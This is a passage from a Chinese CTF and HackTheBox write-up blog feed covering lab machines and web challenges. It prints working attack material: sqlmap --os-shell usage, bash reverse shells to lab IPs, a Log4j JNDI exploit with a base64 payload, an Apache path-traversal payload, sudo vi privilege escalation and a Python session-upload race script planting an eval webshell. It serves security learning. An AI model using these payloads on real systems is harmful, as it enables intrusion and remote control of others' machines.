class="code"><pre><span class="line">zip2john backup.zip &gt; hash.txt </span><br><span class="line">这个是将backup.zip 的哈希导出</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john -wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230408155800420.png" alt="image-20230408155800420"></p><p>然后得出解码的密码是<strong>741852963</strong></p><p>然后就去查看源码</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) === <span class="string">&quot;2cb42f8734ea607eefed3b70af13bbd3&quot;</span>) &#123;</span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: dashboard.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span> &gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;MegaCorp Login&lt;/title&gt;</span><br><span class="line">  &lt;link href=<span class="string">&quot;https://fonts.googleapis.com/css?family=Open+Sans:400,700&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;./style.css&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">  &lt;h1 align=center&gt;MegaCorp Login&lt;/h1&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- partial:index.partial.html --&gt;</span><br><span class="line">&lt;body <span class="class"><span class="keyword">class</span>=&quot;<span class="title">align</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">  &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">grid</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">form</span> <span class="title">action</span>=&quot;&quot; <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span> <span class="title">login</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form__field</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">login__username</span>&quot;&gt;&lt;<span class="title">svg</span> <span class="title">class</span>=&quot;<span class="title">icon</span>&quot;&gt;&lt;<span class="title">use</span> <span class="title">xmlns</span>:<span class="title">xlink</span>=&quot;<span class="title">http</span>://<span class="title">www</span>.<span class="title">w3</span>.<span class="title">org</span>/1999/<span class="title">xlink</span>&quot; <span class="title">xlink</span>:<span class="title">href</span>=&quot;#<span class="title">user</span>&quot;&gt;&lt;/<span class="title">use</span>&gt;&lt;/<span class="title">svg</span>&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">hidden</span>&quot;&gt;<span class="title">Username</span>&lt;/<span class="title">span</span>&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">login__username</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">class</span>=&quot;<span class="title">form__input</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Username</span>&quot; <span class="title">required</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form__field</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">login__password</span>&quot;&gt;&lt;<span class="title">svg</span> <span class="title">class</span>=&quot;<span class="title">icon</span>&quot;&gt;&lt;<span class="title">use</span> <span class="title">xmlns</span>:<span class="title">xlink</span>=&quot;<span class="title">http</span>://<span class="title">www</span>.<span class="title">w3</span>.<span class="title">org</span>/1999/<span class="title">xlink</span>&quot; <span class="title">xlink</span>:<span class="title">href</span>=&quot;#<span class="title">lock</span>&quot;&gt;&lt;/<span class="title">use</span>&gt;&lt;/<span class="title">svg</span>&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">hidden</span>&quot;&gt;<span class="title">Password</span>&lt;/<span class="title">span</span>&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">login__password</span>&quot; <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">class</span>=&quot;<span class="title">form__input</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Password</span>&quot; <span class="title">required</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form__field</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;<span class="title">Sign</span> <span class="title">In</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">  &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">  &lt;<span class="title">svg</span> <span class="title">xmlns</span>=&quot;<span class="title">http</span>://<span class="title">www</span>.<span class="title">w3</span>.<span class="title">org</span>/2000/<span class="title">svg</span>&quot; <span class="title">class</span>=&quot;<span class="title">icons</span>&quot;&gt;&lt;<span class="title">symbol</span> <span class="title">id</span>=&quot;<span class="title">arrow</span>-<span class="title">right</span>&quot; <span class="title">viewBox</span>=&quot;0 0 1792 1792&quot;&gt;&lt;<span class="title">path</span> <span class="title">d</span>=&quot;<span class="title">M1600</span> 960<span class="title">q0</span> 54-37 91<span class="title">l</span>-651 651<span class="title">q</span>-39 37-91 37-51 0-90-37<span class="title">l</span>-75-75<span class="title">q</span>-38-38-38-91<span class="title">t38</span>-91<span class="title">l293</span>-293<span class="title">H245q</span>-52 0-84.5-37.5<span class="title">T128</span> 1024<span class="title">V896q0</span>-53 32.5-90.5<span class="title">T245</span> 768<span class="title">h704L656</span> 474<span class="title">q</span>-38-36-38-90<span class="title">t38</span>-90<span class="title">l75</span>-75<span class="title">q38</span>-38 90-38 53 0 91 38<span class="title">l651</span> 651<span class="title">q37</span> 35 37 90<span class="title">z</span>&quot;/&gt;&lt;/<span class="title">symbol</span>&gt;&lt;<span class="title">symbol</span> <span class="title">id</span>=&quot;<span class="title">lock</span>&quot; <span class="title">viewBox</span>=&quot;0 0 1792 1792&quot;&gt;&lt;<span class="title">path</span> <span class="title">d</span>=&quot;<span class="title">M640</span> 768<span class="title">h512V576q0</span>-106-75-181<span class="title">t</span>-181-75-181 75-75 181<span class="title">v192zm832</span> 96<span class="title">v576q0</span> 40-28 68<span class="title">t</span>-68 28<span class="title">H416q</span>-40 0-68-28<span class="title">t</span>-28-68<span class="title">V864q0</span>-40 28-68<span class="title">t68</span>-28<span class="title">h32V576q0</span>-184 132-316<span class="title">t316</span>-132 316 132 132 316<span class="title">v192h32q40</span> 0 68 28<span class="title">t28</span> 68<span class="title">z</span>&quot;/&gt;&lt;/<span class="title">symbol</span>&gt;&lt;<span class="title">symbol</span> <span class="title">id</span>=&quot;<span class="title">user</span>&quot; <span class="title">viewBox</span>=&quot;0 0 1792 1792&quot;&gt;&lt;<span class="title">path</span> <span class="title">d</span>=&quot;<span class="title">M1600</span> 1405<span class="title">q0</span> 120-73 189.5<span class="title">t</span>-194 69.5<span class="title">H459q</span>-121 0-194-69.5<span class="title">T192</span> 1405<span class="title">q0</span>-53 3.5-103.5<span class="title">t14</span>-109<span class="title">T236</span> 1084<span class="title">t43</span>-97.5 62-81 85.5-53.5<span class="title">T538</span> 832<span class="title">q9</span> 0 42 21.5<span class="title">t74</span>.5 48 108 48<span class="title">T896</span> 971<span class="title">t133</span>.5-21.5 108-48 74.5-48 42-21.5<span class="title">q61</span> 0 111.5 20<span class="title">t85</span>.5 53.5 62 81 43 97.5 26.5 108.5 14 109 3.5 103.5<span class="title">zm</span>-320-893<span class="title">q0</span> 159-112.5 271.5<span class="title">T896</span> 896 624.5 783.5 512 512<span class="title">t112</span>.5-271.5<span class="title">T896</span> 128<span class="title">t271</span>.5 112.5<span class="title">T1280</span> 512<span class="title">z</span>&quot;/&gt;&lt;/<span class="title">symbol</span>&gt;&lt;/<span class="title">svg</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;!-- <span class="title">partial</span> --&gt;</span></span><br><span class="line"><span class="class">  </span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure><p>ftp服务器上的压缩包给了源码   源码里面有了账号和密码但是密码是md5加密过的，那我们就尝试进行md5解密查看一下</p><p><img src="../images/image-20230408160129305.png" alt="image-20230408160129305"></p><p>查到密码，尝试进行网站登录</p><p><img src="../images/image-20230408160208170.png" alt="image-20230408160208170"></p><p>成功登录</p><p><strong>其实这个密码就是个弱口令    然后它输入密码的时候没有进行限制，我们其实可以抓包然后爆破他的密码</strong></p><p><img src="../images/image-20230408160429553.png" alt="image-20230408160429553"></p><p>它这个url存在一个类似sql注入的玩意   所以我们还是可以进行sql注入一下</p><p>加了个单引号就很不争气的露出马脚了,以前讲过报错注入,但是我们最终的目的是获取一定权限,那就要用到 <code>--os-shell</code> 了</p><p><img src="../images/image-20230408160608750.png" alt="image-20230408160608750"></p><p>简单的查询爆出了sql语句  更加说明了存在sql注入了</p><p>那么我们就直接上sqlmap了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://10.129.247.81/dashboard.php?search=1 --cookie=&quot;PHPSESSID=e3ip6sjdos4nrjq6qcoi3vs2k4&quot; --os-shell</span><br></pre></td></tr></table></figure><p>这里的话必须得加上cookie不让获取不成功</p><p>因为它的权限也很低,我连看文件都看不了,继续用 <code>bash</code> 命令连 <code>nc</code></p><p><img src="../images/image-20230408161800060.png" alt="image-20230408161800060"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 443</span><br><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.6/443 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230408161903638.png" alt="image-20230408161903638"></p><p>成功把shell弹过来了</p><p>然后就进行文件的查看</p><p><img src="../images/image-20230408162756772.png" alt="image-20230408162756772"></p><p><img src="../images/image-20230408162735318.png" alt="image-20230408162735318"></p><p>发现数据库的账号密码</p><p>然后由于这里扫端口的时候没发现有数据库的端口</p><p>于是就猜测是不是ssh的端口的账号密码</p><p><img src="../images/image-20230408163006747.png" alt="image-20230408163006747"></p><p>果然是，登录成功</p><p><img src="../images/image-20230408163030228.png" alt="image-20230408163030228"></p><p>拿到user的root,那还有root用户的，所以我们就尝试进行提权</p><p><strong>sudo -l    ———》    -l 显示出自己（执行 sudo 的使用者）的权限</strong></p><p><img src="../images/image-20230408163253349.png" alt="image-20230408163253349"></p><p>发现此用户 /bin/vi 处理/etc/postgresql/11/main/pg_hba.conf 具有root权限</p><p>所以就使用vi来进行提权</p><p>我们可以以 <code>root</code> 权限编辑 <code>pg_hba.conf</code> 文件,输入下面语句,分两次编辑</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf</span><br><span class="line">:set shell=/bin/sh     :wq 保存退出</span><br><span class="line">:shell                 回车</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230408165233922.png" alt="image-20230408165233922"></p><p>这里给我折腾了好久，是写入<strong>:set shell=/bin/sh</strong>，然后在编辑wq处那输入shell</p><p><strong>这里这个提权和suid那个差不多</strong></p><h2 id="Unified-java-Log4j-CVE-202144228"><a href="#Unified-java-Log4j-CVE-202144228" class="headerlink" title="Unified(java - Log4j CVE-202144228)"></a>Unified(java - Log4j CVE-202144228)</h2><p>考点</p><p><img src="../images/image-20230408170926892.png" alt="image-20230408170926892"></p><p>现ping一下<img src="../images/image-20230408171010357.png" alt="image-20230408171010357"></p><p>接下来就是端口扫描了(这里扫的太慢了，就直接拿别人扫的端口来用了)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">6789/tcp open  ibm-db2-admin?</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line">8443/tcp open  ssl/nagios-nsca Nagios NSCA</span><br></pre></td></tr></table></figure><p>就是这些常规的端口</p><p>SSH 登录尝试失败，6789 端口是 <a href="https://so.csdn.net/so/search?q=db2&amp;spm=1001.2101.3001.7020">db2</a> 数据库的管理端口，8080 端口是个代理转发端口，访问会重定向到 8443 端口是 UniFi 6.5.54 产品的页面，发现该版本存在 <strong>CVE-2021-44228 漏洞</strong></p><p><img src="../images/image-20230409161734932.png" alt="image-20230409161734932"></p><p>然后发现这个版本的unifi存在漏洞，就是上面写的CVE漏洞   直接搜就能搜出这个CVE</p><p><strong>漏洞复现</strong></p><p>尝试复现 CVE-2021-44228，曾经风靡一时的漏洞 <code>Apache log4j</code>，这是 java 比较常用的日志监控组件</p><p>原理就是我们创建一个恶意服务，服务器请求执行，达到控制的目的，以<code>rmi</code>为例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RMI是Java的一组拥护开发 分布式应用程序 的 API 。 RMI使用Java语言 接口 定义了远程对象，它集合了Java序列化和Java远程方法协议 (Java Remote Method Protocol)。 简单地说，这样使原先的程序在同一操作系统的方法调用，变成了不同操作系统之间程序的方法调用</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230409163952178.png" alt="image-20230409163952178"></p><p>怎么证明的看这篇文章，这里我就不写了  ——-&gt;   <a href="https://blog.csdn.net/qq_40927195/article/details/128811787?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168102784016800213096118%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168102784016800213096118&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-128811787-null-null.142^v82^insert_down1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=htb%20unified&amp;spm=1018.2226.3001.4187">文章</a></p><p>证明了漏洞存在，接下来进行漏洞的exp利用</p><p><strong>ldap 轻量级目录访问协议，默认端口389，如果存在漏洞发送payload消息，会发送数据报文到本机389端</strong></p><p><strong>漏洞利用</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">准备工具：</span><br><span class="line">1.openjdk-11-jdk</span><br><span class="line">sudo apt-get install openjdk-11-jdk -y </span><br><span class="line">2.Maven</span><br><span class="line">sudo apt-get install maven -y</span><br><span class="line">3.编译maven</span><br><span class="line">git clone https://github.com/veracode-research/rogue-jndi</span><br><span class="line">cd rogue-jndi </span><br><span class="line">mvn package</span><br><span class="line">rogue-jndi：开启本机ldap服务，允许接收其他服务器数据，可执行代码</span><br></pre></td></tr></table></figure><p>准备<code>payload</code>，输出<code>base64</code>编码</p><p><strong>反弹shell</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;bash -c bash -i &gt;&amp;/dev/tcp/10.10.16.24/4444 0&gt;&amp;1&#x27; |base64 </span><br><span class="line">YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjQvNDQ0NCAwPiYxCg==</span><br></pre></td></tr></table></figure><p>搭建 <code>ldap</code> 服务器，传递 <code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar target/RogueJndi-1.1.jar --command &quot;bash -c &#123;echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjQvNDQ0NCAwPiYxCg==&#125;|</span><br><span class="line">&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; --hostname &quot;&#123;10.10.16.24&#125;&quot;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230409165256890.png" alt="image-20230409165256890"></p><p><strong>监听4444端口</strong></p><p><img src="../images/image-20230409165154264.png" alt="image-20230409165154264"></p><p><strong>进行发包</strong></p><p><img src="../images/image-20230409165324463.png" alt="image-20230409165324463"></p><p>因为弹shell死活弹不成功    所以就直接看wp就行了</p><p>wp来看这篇就行了       <a href="https://blog.csdn.net/weixin_51392885/article/details/127849252?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168102784016800213096118%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168102784016800213096118&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-127849252-null-null.142^v82^insert_down1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=htb%20unified&amp;spm=1018.2226.3001.4187">文章</a></p><h2 id=""><a href="#" class="headerlink" title=" "></a> </h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Meow-telnet&quot;&gt;&lt;a href=&quot;#Meow-telnet&quot; class=&quot;headerlink&quot; title=&quot;Meow(telnet)&quot;&gt;&lt;/a&gt;Meow(telnet)&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;../images/image-202303</summary>
      
    
    
    
    
    <category term="htb 渗透" scheme="https://ke1nys.github.io/tags/htb-%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-CMS刷题记录</title>
    <link href="https://ke1nys.github.io/posts/746c3a8a.html"/>
    <id>https://ke1nys.github.io/posts/746c3a8a.html</id>
    <published>2023-03-27T12:23:13.000Z</published>
    <updated>2023-04-06T06:48:36.142Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>nssctf-web-刷题记录</title>
    <link href="https://ke1nys.github.io/posts/92a60629.html"/>
    <id>https://ke1nys.github.io/posts/92a60629.html</id>
    <published>2023-03-23T11:35:27.000Z</published>
    <updated>2023-04-06T06:48:36.155Z</updated>
    
    <content type="html"><![CDATA[<h2 id="NSSRound-1-Basic-basic-check"><a href="#NSSRound-1-Basic-basic-check" class="headerlink" title="[NSSRound#1 Basic]basic_check"></a>[NSSRound#1 Basic]basic_check</h2><p><strong>这里的考点是put方法</strong></p><p>题目</p><p><img src="../images/image-20230323195811854.png" alt="image-20230323195811854"></p><p>就这点东西，然后我们去信息收集，扫一下目录啥的，然后啥也没扫到</p><p>最后是利用<strong>nikto</strong>这个工具才发现的考点   <a href="https://zhuanlan.zhihu.com/p/124246499">nikto工具的介绍</a></p><p><img src="../images/image-20230323200125587.png" alt="image-20230323200125587"></p><p>发现可以使用put方法，这个方法就是可以直接写内容到自定义的文件里</p><p><img src="../images/image-20230323200345772.png" alt="image-20230323200345772"></p><p>这里就发现1.php创建成功了</p><p>然后就成功写入shell，然后就直接去rce就行了</p><p><strong>学到了个新的知识点了</strong></p><h2 id="NSSRound-4-SWPU-ez-rce"><a href="#NSSRound-4-SWPU-ez-rce" class="headerlink" title="[NSSRound#4 SWPU]ez_rce"></a>[NSSRound#4 SWPU]ez_rce</h2><p>考点</p><p><strong>CVE-2021-41773</strong></p><p><a href="https://blog.csdn.net/weixin_45260839/article/details/125113167">CVE-2021-41773(42013) Apache HTTP Server路径穿越漏洞复现</a></p><p><img src="../images/image-20230324192225432.png" alt="image-20230324192225432"></p><p><strong>payload</strong></p><p>bp  —&gt;  POST发包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230324192317206.png" alt="image-20230324192317206"></p><p>因为这里的话flag藏的有点深，直接查找不出来所以就得利用grep命令</p><h2 id="NSSRound-8-Basic-MyDoor"><a href="#NSSRound-8-Basic-MyDoor" class="headerlink" title="[NSSRound#8 Basic]MyDoor"></a>[NSSRound#8 Basic]MyDoor</h2><p>考点</p><p><img src="../images/image-20230324192432327.png" alt="image-20230324192432327"></p><p>这里的话题目的url给了url/index.php?file=  然后就猜一下伪协议，然后拿到源码，然后直接rce就行，在env里</p><h2 id="NSSRound-8-Basic-MyPage"><a href="#NSSRound-8-Basic-MyPage" class="headerlink" title="[NSSRound#8 Basic]MyPage"></a>[NSSRound#8 Basic]MyPage</h2><p>考点</p><p><img src="../images/image-20230324193048319.png" alt="image-20230324193048319"></p><p>题目</p><p><img src="../images/image-20230327172616273.png" alt="image-20230327172616273"></p><p>还是文件包含(只不过这里的话是直接用php为协议是用不了的)</p><p><img src="../images/image-20230327172750597.png" alt="image-20230327172750597"></p><p><img src="../images/image-20230327175508778.png" alt="image-20230327175508778"></p><p><strong>还有一个是pearcmd文件包含</strong></p><p>上面大概就是文件包含的思路了</p><p><strong>方法1</strong></p><p>session文件包含(show里面也有)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading  <span class="comment"># 多线程</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> cffi.backend_ctypes <span class="keyword">import</span> xrange</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">target = <span class="string">&#x27;http://43.143.7.127:28242/&#x27;</span></span><br><span class="line">file = <span class="string">&#x27;ph0ebus.txt&#x27;</span>  <span class="comment"># 上传文件名</span></span><br><span class="line">f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)  <span class="comment"># 文件内容，插入大量垃圾字符来使返回的时间更久，这样临时文件保存的时间更长</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        session.post(target, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,</span><br><span class="line">                     files=&#123;<span class="string">&#x27;file&#x27;</span>: (file, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(</span><br><span class="line">            <span class="string">f&quot;<span class="subst">&#123;target&#125;</span>index.php?file=/tmp/sess_<span class="subst">&#123;sessid&#125;</span>&amp;cmd=system(&#x27;cat index.php&#x27;);&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+]retry&quot;</span>)</span><br><span class="line">            <span class="comment"># print(resp.text)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">30</span>):  <span class="comment"># 每次调用返回其中的一个值，内存空间使用极少，因而性能非常好</span></span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">            <span class="comment"># target：在run方法中调用的可调用对象，即需要开启线程的可调用对象，比如函数或方法；args：在参数target中传入的可调用对象的参数元组，默认为空元组()</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>方法二</strong></p><p>用上面的脚本把题目源码给整出来了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span 